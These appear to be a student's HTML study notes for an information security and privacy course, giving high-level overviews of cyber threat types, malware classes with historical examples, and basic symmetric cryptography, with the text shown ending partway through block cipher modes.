<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
<head>
  <meta charset="utf-8" />
  <meta name="generator" content="pandoc" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
  <title>Information security and privacy</title>
  <style>
    code{white-space: pre-wrap;}
    span.smallcaps{font-variant: small-caps;}
    div.columns{display: flex; gap: min(4vw, 1.5em);}
    div.column{flex: auto; overflow-x: auto;}
    div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
    ul.task-list{list-style: none;}
    ul.task-list li input[type="checkbox"] {
      width: 0.8em;
      margin: 0 0.8em 0.2em -1.6em;
      vertical-align: middle;
    }
    pre > code.sourceCode { white-space: pre; position: relative; }
    pre > code.sourceCode > span { display: inline-block; line-height: 1.25; }
    pre > code.sourceCode > span:empty { height: 1.2em; }
    .sourceCode { overflow: visible; }
    code.sourceCode > span { color: inherit; text-decoration: inherit; }
    div.sourceCode { margin: 1em 0; }
    pre.sourceCode { margin: 0; }
    @media screen {
    div.sourceCode { overflow: auto; }
    }
    @media print {
    pre > code.sourceCode { white-space: pre-wrap; }
    pre > code.sourceCode > span { text-indent: -5em; padding-left: 5em; }
    }
    pre.numberSource code
      { counter-reset: source-line 0; }
    pre.numberSource code > span
      { position: relative; left: -4em; counter-increment: source-line; }
    pre.numberSource code > span > a:first-child::before
      { content: counter(source-line);
        position: relative; left: -1em; text-align: right; vertical-align: baseline;
        border: none; display: inline-block;
        -webkit-touch-callout: none; -webkit-user-select: none;
        -khtml-user-select: none; -moz-user-select: none;
        -ms-user-select: none; user-select: none;
        padding: 0 4px; width: 4em;
        color: #aaaaaa;
      }
    pre.numberSource { margin-left: 3em; border-left: 1px solid #aaaaaa;  padding-left: 4px; }
    div.sourceCode
      {   }
    @media screen {
    pre > code.sourceCode > span > a:first-child::before { text-decoration: underline; }
    }
    code span.al { color: #ff0000; font-weight: bold; } /* Alert */
    code span.an { color: #60a0b0; font-weight: bold; font-style: italic; } /* Annotation */
    code span.at { color: #7d9029; } /* Attribute */
    code span.bn { color: #40a070; } /* BaseN */
    code span.bu { color: #008000; } /* BuiltIn */
    code span.cf { color: #007020; font-weight: bold; } /* ControlFlow */
    code span.ch { color: #4070a0; } /* Char */
    code span.cn { color: #880000; } /* Constant */
    code span.co { color: #60a0b0; font-style: italic; } /* Comment */
    code span.cv { color: #60a0b0; font-weight: bold; font-style: italic; } /* CommentVar */
    code span.do { color: #ba2121; font-style: italic; } /* Documentation */
    code span.dt { color: #902000; } /* DataType */
    code span.dv { color: #40a070; } /* DecVal */
    code span.er { color: #ff0000; font-weight: bold; } /* Error */
    code span.ex { } /* Extension */
    code span.fl { color: #40a070; } /* Float */
    code span.fu { color: #06287e; } /* Function */
    code span.im { color: #008000; font-weight: bold; } /* Import */
    code span.in { color: #60a0b0; font-weight: bold; font-style: italic; } /* Information */
    code span.kw { color: #007020; font-weight: bold; } /* Keyword */
    code span.op { color: #666666; } /* Operator */
    code span.ot { color: #007020; } /* Other */
    code span.pp { color: #bc7a00; } /* Preprocessor */
    code span.sc { color: #4070a0; } /* SpecialChar */
    code span.ss { color: #bb6688; } /* SpecialString */
    code span.st { color: #4070a0; } /* String */
    code span.va { color: #19177c; } /* Variable */
    code span.vs { color: #4070a0; } /* VerbatimString */
    code span.wa { color: #60a0b0; font-weight: bold; font-style: italic; } /* Warning */
  </style>
  <link rel="stylesheet" href="css/pandoc.css" />
  <style>
    html {
      font-size: 100%;
      overflow-y: scroll;
      -webkit-text-size-adjust: 100%;
      -ms-text-size-adjust: 100%;
    }

    body {
      color: #444;
      font-family: Georgia, Palatino, "Palatino Linotype", Times,
        "Times New Roman", serif;
      font-size: 12px;
      line-height: 1.7;
      padding: 1em;
      margin: auto;
      max-width: 42em;
      background: #fefefe;
    }

    a {
      color: #0645ad;
      text-decoration: none;
    }

    a:visited {
      color: #0b0080;
    }

    a:hover {
      color: #06e;
    }

    a:active {
      color: #faa700;
    }

    a:focus {
      outline: thin dotted;
    }

    *::-moz-selection {
      background: rgba(255, 255, 0, 0.3);
      color: #000;
    }

    *::selection {
      background: rgba(255, 255, 0, 0.3);
      color: #000;
    }

    a::-moz-selection {
      background: rgba(255, 255, 0, 0.3);
      color: #0645ad;
    }

    a::selection {
      background: rgba(255, 255, 0, 0.3);
      color: #0645ad;
    }

    p {
      margin: 1em 0;
    }

    img {
      max-width: 100%;
    }

    h1,
    h2,
    h3,
    h4,
    h5,
    h6 {
      color: #111;
      line-height: 125%;
      margin-top: 2em;
      font-weight: normal;
    }

    h4,
    h5,
    h6 {
      font-weight: bold;
    }

    h1 {
      font-size: 2.5em;
    }

    h2 {
      font-size: 2em;
    }

    h3 {
      font-size: 1.5em;
    }

    h4 {
      font-size: 1.2em;
    }

    h5 {
      font-size: 1em;
    }

    h6 {
      font-size: 0.9em;
    }

    blockquote {
      color: #666666;
      margin: 0;
      padding-left: 3em;
      border-left: 0.5em #eee solid;
    }

    hr {
      display: block;
      height: 2px;
      border: 0;
      border-top: 1px solid #aaa;
      border-bottom: 1px solid #eee;
      margin: 1em 0;
      padding: 0;
    }

    pre,
    code,
    kbd,
    samp {
      color: #000;
      font-family: monospace, monospace;
      _font-family: "courier new", monospace;
      font-size: 0.98em;
    }

    pre {
      white-space: pre;
      white-space: pre-wrap;
      word-wrap: break-word;
    }

    b,
    strong {
      font-weight: bold;
    }

    dfn {
      font-style: italic;
    }

    ins {
      background: #ff9;
      color: #000;
      text-decoration: none;
    }

    mark {
      background: #ff0;
      color: #000;
      font-style: italic;
      font-weight: bold;
    }

    sub,
    sup {
      font-size: 75%;
      line-height: 0;
      position: relative;
      vertical-align: baseline;
    }

    sup {
      top: -0.5em;
    }

    sub {
      bottom: -0.25em;
    }

    ul,
    ol {
      margin: 1em 0;
      padding: 0 0 0 2em;
    }

    li p:last-child {
      margin-bottom: 0;
    }

    ul ul,
    ol ol {
      margin: 0.3em 0;
    }

    dl {
      margin-bottom: 1em;
    }

    dt {
      font-weight: bold;
      margin-bottom: 0.8em;
    }

    dd {
      margin: 0 0 0.8em 2em;
    }

    dd:last-child {
      margin-bottom: 0;
    }

    img {
      border: 0;
      -ms-interpolation-mode: bicubic;
      vertical-align: middle;
    }

    figure {
      display: block;
      text-align: center;
      margin: 1em 0;
    }

    figure img {
      border: none;
      margin: 0 auto;
    }

    figcaption {
      font-size: 0.8em;
      font-style: italic;
      margin: 0 0 0.8em;
    }

    table {
      margin-bottom: 2em;
      border-bottom: 1px solid #ddd;
      border-right: 1px solid #ddd;
      border-spacing: 0;
      border-collapse: collapse;
    }

    table th {
      padding: 0.2em 1em;
      background-color: #eee;
      border-top: 1px solid #ddd;
      border-left: 1px solid #ddd;
    }

    table td {
      padding: 0.2em 1em;
      border-top: 1px solid #ddd;
      border-left: 1px solid #ddd;
      vertical-align: top;
    }

    .author {
      font-size: 1.2em;
      text-align: center;
    }

    @media only screen and (min-width: 480px) {
      body {
        font-size: 14px;
      }
    }
    @media only screen and (min-width: 768px) {
      body {
        font-size: 16px;
      }
    }
    @media print {
      * {
        background: transparent !important;
        color: black !important;
        filter: none !important;
        -ms-filter: none !important;
      }

      body {
        font-size: 12pt;
        max-width: 100%;
      }

      a,
      a:visited {
        text-decoration: underline;
      }

      hr {
        height: 1px;
        border: 0;
        border-bottom: 1px solid black;
      }

      a[href]:after {
        content: " (" attr(href) ")";
      }

      abbr[title]:after {
        content: " (" attr(title) ")";
      }

      .ir a:after,
      a[href^="javascript:"]:after,
      a[href^="#"]:after {
        content: "";
      }

      pre,
      blockquote {
        border: 1px solid #999;
        padding-right: 1em;
        page-break-inside: avoid;
      }

      tr,
      img {
        page-break-inside: avoid;
      }

      img {
        max-width: 100% !important;
      }

      @page :left {
        margin: 15mm 20mm 15mm 10mm;
      }

      @page :right {
        margin: 15mm 10mm 15mm 20mm;
      }

      p,
      h2,
      h3 {
        orphans: 3;
        widows: 3;
      }

      h2,
      h3 {
        page-break-after: avoid;
      }
    }
  </style>
  <script src="https://cdn.jsdelivr.net/npm/darkreader@4.7.15/darkreader.min.js"></script>
  <script>
    DarkReader.enable({
      brightness: 100,
      contrast: 90,
      sepia: 10,
    });
  </script>
  <link
    rel="icon"
    type="image/png"
    href="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcTJg97A-Sa8mxjkRCmjR51WjHATLvq2aF89Z1CprR2WcQ60qYZC"
  />
  <meta name="theme-color" content="#252525" />
  <script defer=""
  src="https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.js"></script>
  <script>document.addEventListener("DOMContentLoaded", function () {
 var mathElements = document.getElementsByClassName("math");
 var macros = [];
 for (var i = 0; i < mathElements.length; i++) {
  var texText = mathElements[i].firstChild;
  if (mathElements[i].tagName == "SPAN") {
   katex.render(texText.data, mathElements[i], {
    displayMode: mathElements[i].classList.contains('display'),
    throwOnError: false,
    macros: macros,
    fleqn: false
   });
}}});
  </script>
  <link rel="stylesheet"
  href="https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.css" />
  <!--[if lt IE 9]>
    <script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv-printshiv.min.js"></script>
  <![endif]-->
</head>
<body>
<header id="title-block-header">
<h1 class="title">Information Security and Privacy</h1>
</header>
<nav id="TOC" role="doc-toc">
<ul>
<li><a href="#introduction-to-cyber-threats"
id="toc-introduction-to-cyber-threats">Introduction to cyber threats</a>
<ul>
<li><a href="#motivation-for-attacks"
id="toc-motivation-for-attacks">Motivation for attacks</a></li>
<li><a href="#value-of-a-hacked-pc" id="toc-value-of-a-hacked-pc">Value
of a hacked PC</a></li>
<li><a href="#cyber-attack-lifecycle"
id="toc-cyber-attack-lifecycle">Cyber attack lifecycle</a></li>
<li><a href="#commodity-threats" id="toc-commodity-threats">Commodity
threats</a></li>
<li><a href="#hacktivism" id="toc-hacktivism">Hacktivism</a></li>
<li><a href="#advanced-persistent-threat"
id="toc-advanced-persistent-threat">Advanced Persistent Threat</a></li>
<li><a href="#classes-of-malware" id="toc-classes-of-malware">Classes of
Malware</a></li>
<li><a href="#social-engineering" id="toc-social-engineering">Social
engineering</a></li>
<li><a href="#vulnerabilities-and-exploits"
id="toc-vulnerabilities-and-exploits">Vulnerabilities and
exploits</a></li>
</ul></li>
<li><a href="#exercises-1" id="toc-exercises-1">Exercises 1</a></li>
<li><a href="#crypto-basics" id="toc-crypto-basics">Crypto Basics</a>
<ul>
<li><a href="#naive-approach-to-encryption"
id="toc-naive-approach-to-encryption">Naive approach to
encryption</a></li>
<li><a href="#symmetric-crypto" id="toc-symmetric-crypto">Symmetric
Crypto</a></li>
<li><a href="#data-integrity" id="toc-data-integrity">Data
Integrity</a></li>
<li><a href="#authenticated-encryption"
id="toc-authenticated-encryption">Authenticated Encryption</a></li>
<li><a href="#public-key-cryptography"
id="toc-public-key-cryptography">Public-key cryptography</a></li>
<li><a href="#public-key-distribution"
id="toc-public-key-distribution">Public key distribution</a></li>
<li><a href="#crypto-summary" id="toc-crypto-summary">Crypto
summary</a></li>
<li><a href="#case-study-tls" id="toc-case-study-tls">Case study:
TLS</a></li>
<li><a href="#exercises-2" id="toc-exercises-2">Exercises 2</a></li>
</ul></li>
<li><a href="#access-control" id="toc-access-control">Access control</a>
<ul>
<li><a href="#basics" id="toc-basics">Basics</a></li>
<li><a href="#multiple-approaches-to-access-control"
id="toc-multiple-approaches-to-access-control">Multiple Approaches to
access control</a></li>
<li><a href="#authentication"
id="toc-authentication">Authentication</a></li>
<li><a href="#authentication-protocols"
id="toc-authentication-protocols">Authentication protocols</a></li>
<li><a href="#delegated-authentication"
id="toc-delegated-authentication">Delegated authentication</a></li>
<li><a href="#authentication-summary"
id="toc-authentication-summary">Authentication summary</a></li>
</ul></li>
<li><a href="#exercises-3" id="toc-exercises-3">Exercises 3</a></li>
<li><a href="#data-security" id="toc-data-security">Data Security</a>
<ul>
<li><a href="#typical-setups" id="toc-typical-setups">Typical
setups</a></li>
<li><a href="#multitier-architecture"
id="toc-multitier-architecture">Multitier architecture</a></li>
<li><a href="#database-access-control"
id="toc-database-access-control">Database access control</a></li>
<li><a href="#encrypting-the-data"
id="toc-encrypting-the-data">Encrypting the data</a></li>
<li><a href="#password-storage" id="toc-password-storage">Password
storage</a></li>
<li><a href="#secure-remote-password-protocol"
id="toc-secure-remote-password-protocol">Secure remote password
protocol</a></li>
</ul></li>
<li><a href="#exercises-4" id="toc-exercises-4">Exercises 4</a></li>
<li><a href="#programming-languages-security"
id="toc-programming-languages-security">Programming languages
security</a>
<ul>
<li><a href="#motivation" id="toc-motivation">Motivation</a></li>
<li><a href="#type-safety" id="toc-type-safety">Type safety</a></li>
<li><a href="#memory-safety" id="toc-memory-safety">Memory
safety</a></li>
<li><a href="#thread-safety" id="toc-thread-safety">Thread
safety</a></li>
<li><a href="#sandboxing-and-comparmentalization"
id="toc-sandboxing-and-comparmentalization">Sandboxing and
comparmentalization</a></li>
</ul></li>
<li><a href="#exercises-5" id="toc-exercises-5">Exercises 5</a></li>
<li><a href="#web-and-software-security"
id="toc-web-and-software-security">Web and software security</a>
<ul>
<li><a href="#owasp-top-10" id="toc-owasp-top-10">OWASP Top 10</a></li>
<li><a href="#arbitrary-code-execution"
id="toc-arbitrary-code-execution">Arbitrary code execution</a></li>
<li><a href="#software-security" id="toc-software-security">Software
security</a></li>
</ul></li>
<li><a href="#exercises-6" id="toc-exercises-6">Exercises 6</a></li>
<li><a href="#automated-testing" id="toc-automated-testing">Automated
Testing</a>
<ul>
<li><a href="#manual-testing" id="toc-manual-testing">Manual
testing</a></li>
<li><a href="#semi-automated-testing"
id="toc-semi-automated-testing">Semi-automated testing</a></li>
<li><a href="#automated-testing-1"
id="toc-automated-testing-1">Automated testing</a></li>
<li><a href="#comparison-of-analyses"
id="toc-comparison-of-analyses">Comparison of Analyses</a></li>
</ul></li>
<li><a href="#exercises-7" id="toc-exercises-7">Exercises 7</a></li>
<li><a href="#network-security" id="toc-network-security">Network
security</a>
<ul>
<li><a href="#best-practices" id="toc-best-practices">Best
practices</a></li>
<li><a href="#network-segmentation"
id="toc-network-segmentation">Network segmentation</a></li>
<li><a href="#protecting-remote-access---virtual-private-networks"
id="toc-protecting-remote-access---virtual-private-networks">Protecting
remote access - Virtual Private Networks</a></li>
<li><a href="#protecting-the-perimeter"
id="toc-protecting-the-perimeter">Protecting the perimeter</a></li>
<li><a href="#protecting-the-workstation"
id="toc-protecting-the-workstation">Protecting the workstation</a></li>
</ul></li>
<li><a href="#exercises-8" id="toc-exercises-8">Exercises 8</a></li>
<li><a href="#mobile-security" id="toc-mobile-security">Mobile
security</a>
<ul>
<li><a href="#mobile-security-motivation"
id="toc-mobile-security-motivation">Mobile security motivation</a></li>
<li><a href="#attack-vectors" id="toc-attack-vectors">Attack
vectors</a></li>
<li><a href="#android-vs-ios" id="toc-android-vs-ios">Android vs
iOS</a></li>
<li><a href="#arm---armv8" id="toc-arm---armv8">ARM - ARMv8</a></li>
<li><a href="#android-ecosystem-and-security"
id="toc-android-ecosystem-and-security">Android ecosystem and
security</a></li>
<li><a href="#android-apps" id="toc-android-apps">Android Apps</a></li>
<li><a href="#app-security" id="toc-app-security">App security</a></li>
<li><a href="#reversing-android-apps"
id="toc-reversing-android-apps">Reversing Android Apps</a></li>
<li><a href="#kernel-security-and-selinux"
id="toc-kernel-security-and-selinux">Kernel security and
SELinux</a></li>
</ul></li>
<li><a href="#exercises-9" id="toc-exercises-9">Exercises 9</a></li>
<li><a href="#trusted-computing" id="toc-trusted-computing">Trusted
Computing</a>
<ul>
<li><a href="#confidential-computing"
id="toc-confidential-computing">Confidential computing</a></li>
<li><a href="#what-if-we-can-trust-the-hardware"
id="toc-what-if-we-can-trust-the-hardware">What if we can trust the
hardware</a></li>
<li><a href="#trusted-hardware" id="toc-trusted-hardware">Trusted
hardware</a></li>
<li><a href="#side-channels" id="toc-side-channels">Side
channels</a></li>
<li><a href="#microarchitectural-side-channels"
id="toc-microarchitectural-side-channels">Microarchitectural
side-channels</a></li>
</ul></li>
<li><a href="#exercises-10" id="toc-exercises-10">Exercises 10</a></li>
<li><a href="#privacy" id="toc-privacy">Privacy</a>
<ul>
<li><a href="#why-privacy-matters" id="toc-why-privacy-matters">Why
privacy matters</a></li>
<li><a href="#so-what-if-they-know" id="toc-so-what-if-they-know">So
what if they know</a></li>
<li><a href="#privacy-of-whom" id="toc-privacy-of-whom">Privacy of
whom?</a></li>
<li><a href="#what-is-privacy" id="toc-what-is-privacy">What is
Privacy?</a></li>
<li><a href="#adversary-of-privacy"
id="toc-adversary-of-privacy">Adversary of privacy</a></li>
<li><a href="#building-privacy-preserving-systems"
id="toc-building-privacy-preserving-systems">Building privacy-preserving
systems</a></li>
<li><a href="#example-of-evalutation"
id="toc-example-of-evalutation">Example of evalutation</a></li>
<li><a href="#interactive-scenation"
id="toc-interactive-scenation">Interactive scenation</a></li>
</ul></li>
<li><a href="#exercises-11" id="toc-exercises-11">Exercises 11</a></li>
<li><a href="#ml-security" id="toc-ml-security">ML Security</a>
<ul>
<li><a href="#machine-learning" id="toc-machine-learning">Machine
learning</a></li>
<li><a href="#model-stealing" id="toc-model-stealing">Model
stealing</a></li>
<li><a href="#privacy-challenges-in-ml"
id="toc-privacy-challenges-in-ml">Privacy challenges in ML</a></li>
<li><a href="#altering-the-output" id="toc-altering-the-output">Altering
the Output</a></li>
<li><a href="#biases-and-fallacies" id="toc-biases-and-fallacies">Biases
and Fallacies</a></li>
</ul></li>
<li><a href="#exercises-12" id="toc-exercises-12">Exercises 12</a></li>
</ul>
</nav>
<!-- markdownlint-disable MD010 MD041 MD001 MD036 MD029-->
<h2 id="introduction-to-cyber-threats">Introduction to cyber
threats</h2>
<p><strong>Cyber threats</strong> Def 1: potential cause of an unwanted
incident, which can result in harm to a system or organization</p>
<p>Types of threats:</p>
<ul>
<li>environmental threats: fire, water, pollution, earthquakes…</li>
<li>loss of essential services: power, cooling, communication</li>
<li>technical failures: disk failure</li>
<li>cyber: malicious software, denial of service, social engineering,
software vulnerabilities/exploits</li>
</ul>
<h3 id="motivation-for-attacks">Motivation for attacks</h3>
<p>Originally - curiosity, fun, fame</p>
<p>Now:</p>
<ul>
<li>profit - small crime, organized crime, industrial espionage</li>
<li>beliefs (hacktivism) - e.g. Anonymous, Lulzec, Guardians of
Peace</li>
<li>national security - police forces, national intelligence</li>
</ul>
<p>Profit (dark side):</p>
<ul>
<li>getting clicks on spam or ads</li>
<li>resale of accounts, credit card numbers</li>
<li>rental of hacked PCs (botnets)</li>
<li>demand of ransom</li>
</ul>
<p>Profit (gray side) - sell the vulnerabilities you discover to some
broker</p>
<h3 id="value-of-a-hacked-pc">Value of a hacked PC</h3>
<p>Hacked PC has a lot of value for various exploits (see slide 0x01
6)</p>
<h3 id="cyber-attack-lifecycle">Cyber attack lifecycle</h3>
<p>Preparation:</p>
<ul>
<li>define target, from broad (everyone) to focused (individual)</li>
<li>find and organize accomplices</li>
<li>build and/or acquire tools</li>
<li>research target (infra &amp; people)</li>
<li>test for detection</li>
</ul>
<p>Gain access:</p>
<ul>
<li>deployment (social engineering, exploits, etc)</li>
<li>initial intrusion</li>
<li>outbound connection extablished</li>
</ul>
<p>Maintain access:</p>
<ul>
<li>strengthen foothold - persistence, lateral movement</li>
<li>expand access, obtain credentials</li>
</ul>
<p>Complete mission:</p>
<ul>
<li>exfiltrate data</li>
<li>manipulate, sabotage data</li>
</ul>
<p>Cover tracks - delete log data</p>
<h3 id="commodity-threats">Commodity threats</h3>
<p>they are non-targeted (“shotgun” approach) usually non-stealth and
fully automated goal is often short-term financial gains often
considered low-risk for the attackers possible starting point for more
sophisticated attacks</p>
<p>Forms:</p>
<ul>
<li>malware infected spam</li>
<li>extorsion spam</li>
<li>malicious ads</li>
<li>computer worm</li>
</ul>
<h4 id="malware-spam">Malware spam</h4>
<p>It is sent broadly to many people (i.e. not targeted) Crude
customization (e.g. Swiss Post, Linkedin) Attachment contains well-known
malware Campaigns are life hours to days</p>
<h4 id="extorsion">Extorsion</h4>
<p>Sent broadly to many people (i.e. not targeted) Relies on leaked
information, e.g. password lists Convinces user of “hack”</p>
<h3 id="hacktivism">Hacktivism</h3>
<p>Several meanings such as: politically moticated hacking, variant of
(anarchic) civil disobedience</p>
<p>Good options:</p>
<ul>
<li>create software to encrypt communications</li>
<li>create tools to bypass censorship</li>
</ul>
<p>Cyber threats:</p>
<ul>
<li>website defacement (e.g. Anonymous, Lulzsec)</li>
<li>Anonymous publication of confidential data (wikileaks, i guess)</li>
<li>DDoS</li>
</ul>
<h4 id="examples-of-hacktivism">Examples of Hacktivism</h4>
<p>Panama Papers (2016): Somebody stole and published documents about
214,000 offshore companies incorporated in Panama</p>
<p>Epik data breach (2021): A group of hacktivists exposed customer
personal and credit card information, company emails, etc. from websites
hosting extremist content, called the ‘Panama papers of hate groups’</p>
<p>OpRussia (2022): Anonymous launched cyber operations against the
Russian Federation in retaliation for the invasion of Ukraine. Website
defacement, email leaks from weapon manufacturers, hacked TV channels
and surveillance cameras, etc.</p>
<h3 id="advanced-persistent-threat">Advanced Persistent Threat</h3>
<p><strong>Advanced</strong> - targeted, multi-step attack, often uses
specialized tools, often starts with spear-phishing (targeted phishing
attack)</p>
<p><strong>Persistent</strong> - ‘low and slow’ approach, prioritize
long-term over short-term goals, conitnuous monitoring and interaction
(attacks are known to have lasted 5 years)</p>
<p><strong>Threat</strong> - human coordinated attack; attackers are
skilled, motivated and well-funded (e.g. industrial espionage). No ‘fire
and forget’ approach, not fully automated</p>
<h4 id="example-of-apt-ruag">Example of APT: RUAG</h4>
<h3 id="classes-of-malware">Classes of Malware</h3>
<p>Virus - spreads by infecting other files</p>
<p>Worm: spreads automatically to other systems</p>
<p>Trojan: malware hidden in useful software</p>
<p>Rootkit: hides presence of malware on computer</p>
<p>Ransomware: encrypts files and requests payment for decryption</p>
<p>Nation state malware: malware developed by a nation-state</p>
<h4 id="virus">Virus</h4>
<p>Virus is a malware that infects a file and replicates by infecting
other files</p>
<p>By definition, it does not propage automatically to other
computers.</p>
<p>(Also, generic term for malware)</p>
<h4 id="worm">Worm</h4>
<p>Worm is a piece of malware that propagates automatically</p>
<p><em>Morris worm</em>:</p>
<ul>
<li>first internet worm, written by R T Morris at Cornell in 1988</li>
<li>used vulneravilities in sendmail, finger and rsh software to
propagate</li>
<li>inteded goal - map the existing internet</li>
<li>accidental side effect - computers could be infected multiple times,
overloading them until they were unusable</li>
<li>infected 10% of the internet (estimate)</li>
<li>Morris got 400 hours of community service and 10k fine</li>
</ul>
<h4 id="trojan">Trojan</h4>
<p>Strictly, a malware hidden in a useful software or file (e.g. pirated
game)</p>
<p>More generally, a malware that stays on the victim’s computer and
communicates with a control center to carry out malicious activity</p>
<p><em>ZeuS Trojan</em>:</p>
<ul>
<li>sold as kit for 3-4k</li>
<li>infected millions of computers</li>
<li>captures passwords and other information</li>
<li>steals money through online banking</li>
<li>over 100 people arrested (money mules)</li>
<li>alleged mastermind was arrested in 2013</li>
</ul>
<h4 id="rootkit">Rootkit</h4>
<p>Rootkit hides the presence of malware on a computer</p>
<p>It patches the OS such that malicious files, processes,
communications are not shown anymore</p>
<p>It makes it very difficult to detect and eliminate the malware</p>
<p>This is why you should boot from clean OS to search for malware on
your system</p>
<p>Modern OSes verify the integrity of all privileged code (kernel,
drivers, modules) before running them</p>
<p>Modern rootkits therefore modify the OS before it boots by infecting
the boot sector or by infecting the BIOS!</p>
<h4 id="ransomware">Ransomware</h4>
<p>Ransomware encrypts the files and requests payment for decryption</p>
<p>After payment is received, the decryption key is (often) obtained</p>
<p>Bitcoin has made it possible for malicious software developers to
make a lot of money with little effort or risk</p>
<p>according to Symantec, in 2014 CryptoLocker extorted about 23mil</p>
<p>Typical ransom for private users are ~500, companies pay much
more</p>
<p>Simple way of limiting rist are recent (offline, protected)
backups</p>
<h4 id="nation-stae-malware-stuxnet">Nation-stae Malware: Stuxnet</h4>
<p>Highly advanced malware</p>
<p>Used for targeted sabotage of Iran’s nuclear program</p>
<p>Supposedly developed by an American-Israeli team</p>
<p>Exploited for 0-day exploits in Windows</p>
<p>Accidentally spread beyond its intended target due to a programming
error</p>
<h4 id="botnets---compute-for-hire">Botnets - compute for hire</h4>
<p>Mirai botnet consists of 150k IoT cameras</p>
<p>Used to sell compute for, e.g. DDoS</p>
<p>DoS overwhelms target computer with large amount of requests</p>
<h3 id="social-engineering">Social engineering</h3>
<p>“Hacking Humans” - use psychological tricks to manipulate another
human</p>
<p>Social engineers use phishing, pretexting, baiting or tailgating</p>
<p>May target employees, customers or vendors</p>
<p>Intent to obtain sensitive information, gain unauthorized access,
commit fraud</p>
<p>Prevented by awareness, training, and robust security measures</p>
<h3 id="vulnerabilities-and-exploits">Vulnerabilities and exploits</h3>
<p><strong>Vulnerability</strong> - weakness in logic, the software or
hardware of a system (bugs)</p>
<p><strong>Exploit</strong> - method/tool to take advantage of a
vulnerability</p>
<p>Vulnerabilities can be fixed by patching a system</p>
<p><strong>Zero day exploit</strong> - exploit which no patch exists yet
because the developers don’t know about it yet (since 0 days)</p>
<p>They can be mitigated by making them difficult to exploit - isolate
the system or add multiple layers of security</p>
<h4 id="typical-software-vulnerabilities">Typical software
vulnerabilities</h4>
<p>Buffer / heap / stack overflows - violating memory safety</p>
<p>Unvalidated input, including SQL injection: mixing code and data</p>
<p>Race conditions: changes of the order of events cause a change in
behaviour</p>
<p>Insecure file operations: incorrect assumptions about ownership,
location or attributes</p>
<p>Side-channel leakage: leaking information via time, power, sound,
etc.</p>
<p>Weaknesses in the implementation of access control: authentication
and authorization flaws</p>
<h2 id="exercises-1">Exercises 1</h2>
<p><strong>Exercise 1</strong> Matching mechanisms authenticity -
message authentication code (keyed hash) availability -
duplicate/distribute system confidentiality - isolation intergrity -
hash</p>
<p><strong>Exercise 2</strong> q: In your opinion, what is the most
important technical means you need to have in order to be protected
against ransomware attacks? a: secured backups on a separate hardware,
because if ransom is asked, then it is not required to pay out the
ransom to get the information back.</p>
<p><strong>Exercise 3</strong> q: You are developing a website that
sells cigarettes online in Switzerland. Imagine a cyber threat of each
category below. For each threat, describe the goal of the threat and by
which means the goal is achieved:</p>
<ul>
<li>Commodity threat - get money from highly profitable company.
Extorsion.</li>
<li>Hacktivism: goal - reduce smoking.</li>
</ul>
<p><strong>Exercise 4</strong> q:In you opinion, is an anti-virus
software a good protection against social engineering attacks carried
out over e-mail? Explain why. What would be the best way of protecting
against these attacks? a: no, because the attacks are aimed at people,
not software availability or infection. To protect against these
attacks, it is best to spread awareness</p>
<p><strong>Exercise 5</strong> q: An anti-malware tool adds up the sizes
of all files on a disk, adds the size of the empty space and compares it
to the total disk size. What type of malware is this software trying to
detect? Explain why. a: trojan</p>
<h2 id="crypto-basics">Crypto Basics</h2>
<p>Goals of cryptography:</p>
<ul>
<li>Confidentiality - data is only accessible with the correct key</li>
<li>Integrity - any modification of data can be detected (in security it
says that it cannot be <em>modified</em>)</li>
<li>Authentification - the author of a message can be identified</li>
<li>Non Repudiation - the author of a message cannot deny being the
author</li>
</ul>
<h3 id="naive-approach-to-encryption">Naive approach to encryption</h3>
<h4 id="rotation-cipher">Rotation cipher</h4>
<p>Two parties agree on an algorithm and keep it secret</p>
<p>Problem: if you know that it is a shift, it only takes 26 trials to
break it.</p>
<p>So Kerckhoff’s principle comes into effect: a cryptosystem should be
secure even if everything about the system, except the key, is public
knowledge</p>
<h4 id="one-time-pad">One-time pad</h4>
<p>Key is a random string and at least as long as plaintext Encryption -
XOR operation to encrypt and decrypt</p>
<p>It is <strong>perfect</strong> in theory.</p>
<p>Disadvatages: needs truly random uniform random one-time pad key must
not be used more than once key length depends on the message length</p>
<p>It is benefitial when the communication is not immediate. Key can be
exchanged once and then use it at some point in time.</p>
<h3 id="symmetric-crypto">Symmetric Crypto</h3>
<p>Encryption and decryptopm are done with the <strong>same
key</strong>. Solves the problem of transferring large amounts of
confidential data by creating the problem of <strong>key
exchange</strong></p>
<h4 id="stream-cipher">Stream cipher</h4>
<p>Use a key and pseudo random number generator to encrypt the data with
the random bits (with XOR). Initialize RNG with key as seed.</p>
<p>Pros: can encrypt data of arbitrary length</p>
<p><strong>Limitations</strong>:</p>
<p><strong>Malleability</strong> - if you flip one bit of the
ciphertext, then one bit will be flipped in the cleartext. E.g. if you
know which bit encodes the sign of a value, you can change a payment
from 100 to -100. That is why ther should always be integrity check
added when encrypting data</p>
<p><strong>Cipher-reuse</strong> - if two messages are encrypted with
the same stream, then there could be some bits leaked from the message.
<span class="math inline">M_1 \oplus M_2 = C_1 \oplus C_2</span> <span
class="math inline">M_2[k] = M_1[k] \oplus C_1[k] \oplus
C_2[k]</span></p>
<p><strong>Initialization vector</strong> Stream cipher with
initialization vector (IV). IV has to be sent with each message. IV can
just be a random number.</p>
<h4 id="block-cipher">Block cipher</h4>
<p>Encrypts a <strong>fixed size</strong> blocks of data</p>
<ul>
<li>a <strong>padding scheme</strong> is used to fill the last block
(with random stuff)</li>
<li>a <strong>mod of operation</strong> to combine multiple blocks</li>
</ul>
<p>Data Encryption Standard (DES):</p>
<ul>
<li>block size 64 bits (too short, collisions)</li>
<li>key size 56 bits (too short, can be brute forced) (because
goverments wanted to be able to brute force)</li>
</ul>
<p>Advanced Encryption Standard (AES):</p>
<ul>
<li>block size 128 bits</li>
<li>key size 128/192/256 bits</li>
<li>hardware support (e.g. Intel, AMD, ARMv8)</li>
</ul>
<p><em>When in doubt - use AES</em></p>
<p><strong>Modes of Operation</strong>:</p>
<p><strong>ECB</strong>: Encrypt each block separately with the same
key.</p>
<p>Problem - every block with the same data will look like encrypted
same data</p>
